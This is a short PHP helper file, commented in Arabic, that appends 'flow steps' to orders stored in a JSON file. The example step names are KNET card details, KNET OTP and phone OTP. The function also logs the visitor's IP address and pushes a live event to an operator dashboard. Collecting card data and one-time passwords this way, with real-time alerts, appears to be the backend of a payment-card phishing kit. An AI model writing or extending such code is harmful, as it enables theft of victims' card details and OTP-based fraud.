<?php
/**
 * إلحاق خطوة تدفق (KNET / ver OTP) بطلب في data/orders.json
 * يُستدعى من save_flow_step.php أو من صفحات PHP مثل ver.php
 */

if (!function_exists('farm_append_order_flow')) {
    /**
     * @param string|int $orderId
     * @param string $step مثل knet_card_details | knet_otp | ver_phone_otp
     * @param array<string,mixed> $data
     */
    function farm_append_order_flow($orderId, string $step, array $data): bool
    {
        $orderId = (string) $orderId;
        if ($orderId === '' || $step === '') {
            return false;
        }

        $ordersFile = __DIR__ . '/data/orders.json';
        if (!file_exists($ordersFile)) {
            return false;
        }

        $fp = fopen($ordersFile, 'c+');
        if ($fp === false) {
            return false;
        }
        if (!flock($fp, LOCK_EX)) {
            fclose($fp);
            return false;
        }

        rewind($fp);
        $content = stream_get_contents($fp);
        $orders = json_decode($content, true);
        if (!is_array($orders)) {
            flock($fp, LOCK_UN);
            fclose($fp);
            return false;
        }

        $entry = [
            'step' => $step,
            'timestamp' => date('Y-m-d H:i:s'),
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'data' => $data,
        ];

        $found = false;
        foreach ($orders as &$order) {
            if (!is_array($order)) {
                continue;
            }
            if ((string) ($order['id'] ?? '') !== $orderId) {
                continue;
            }
            $found = true;
            if (!isset($order['flow_data']) || !is_array($order['flow_data'])) {
                $order['flow_data'] = [];
            }
            array_unshift($order['flow_data'], $entry);
            break;
        }
        unset($order);

        if (!$found) {
            flock($fp, LOCK_UN);
            fclose($fp);
            return false;
        }

        $json = json_encode($orders, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        if ($json === false) {
            flock($fp, LOCK_UN);
            fclose($fp);
            return false;
        }

        rewind($fp);
        ftruncate($fp, 0);
        fwrite($fp, $json);
        fflush($fp);
        flock($fp, LOCK_UN);
        fclose($fp);

        if (is_file(__DIR__ . '/includes/farm_pusher_broadcast.php')) {
            require_once __DIR__ . '/includes/farm_pusher_broadcast.php';
            farm_pusher_broadcast('dashboard-event', [
                'kind' => 'flow_step',
                'order_id' => $orderId,
                'step' => $step,
            ]);
            farm_pusher_broadcast('dashboard-event', ['kind' => 'orders_updated']);
        }

        return true;
    }
}
